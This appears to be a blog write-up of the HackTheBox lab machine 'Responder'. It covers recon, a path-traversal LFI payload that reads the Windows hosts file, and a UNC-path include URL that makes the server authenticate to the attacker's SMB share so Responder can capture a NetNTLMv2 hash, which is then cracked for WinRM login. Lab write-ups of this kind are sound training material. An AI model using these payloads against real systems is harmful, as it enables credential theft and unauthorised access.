---
layout: post
title: "HTB: Responder"
subtitle: "PHP LFI on Windows, point the include at a UNC path to coerce an SMB auth to Responder, crack the NetNTLMv2"
date: 2023-05-29
tags: [htb, windows, lfi, responder, netntlm, starting-point]
category: writeups
kind: machine
os: Windows
tldr: "unika.htb serves PHP on Windows with a page= parameter that includes files with no sanitising. LFI on Windows works the same as Linux, traversal plus the path, confirmed by reading the Windows hosts file. Because the include accepts a path, point it at a UNC share on your box. The server authenticates outbound to that SMB path, Responder logs the NetNTLMv2, and cracking it offline gives a password that logs in over WinRM on 5985."
---

## the box

Responder is an HTB Starting Point Windows box at `10.129.227.174`. The front is Apache serving PHP, and the one interesting parameter is a page switch that includes files off disk with no sanitising. That local file inclusion does not run code on its own, but PHP on Windows resolves a UNC path the same as a local one, so I can make the server reach back to an SMB listener I control. That turns the file read into outbound authentication, Responder logs the NetNTLMv2, and the cracked password logs in over WinRM on 5985.

## recon

A full TCP scan with service detection:

```bash
$ nmap -p- -sCV 10.129.227.174
```

```
80/tcp   open  http       Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
5985/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp open  pando-pub?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Three ports. 80 is the PHP app, 5985 is WinRM (the `Microsoft-HTTPAPI/2.0` banner), and 7680 nmap could not identify and I never touched. The `Service Info` line confirms Windows. The vhost is `unika.htb`, so I added it to `/etc/hosts`.

## LFI

The language switch uses `?page=`, and it includes whatever you hand it with no sanitising. Traversing up to the Windows hosts file confirmed the read:

```
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
```

LFI on a Windows target works the same way it does on Linux. You add the traversal and then the path you want, and the contents come back in the page. Reading `hosts` is enough to prove the parameter reaches the filesystem directly.

## from a file read to a hash

The include accepts a path, and a Windows host will follow a UNC path out onto the network. Point it at a share on your own box:

```
http://unika.htb/index.php?page=//10.10.x.x/share/anything
```

The server tries to open that SMB path and authenticates outbound to it. With Responder listening on that interface, it catches the NetNTLMv2 for the account the web service runs as. Crack it offline, and the recovered password logs in over WinRM on 5985 (evil-winrm is the usual client). That shell held the flag, which I read and submitted.

## takeaway

The file read never executed anything by itself. The move that mattered is that a Windows include will follow a UNC path, which converts "read a file" into "authenticate to a host I control". Once the server is reaching out to my SMB listener, capturing and cracking the NetNTLMv2 is routine, and the same password opens WinRM.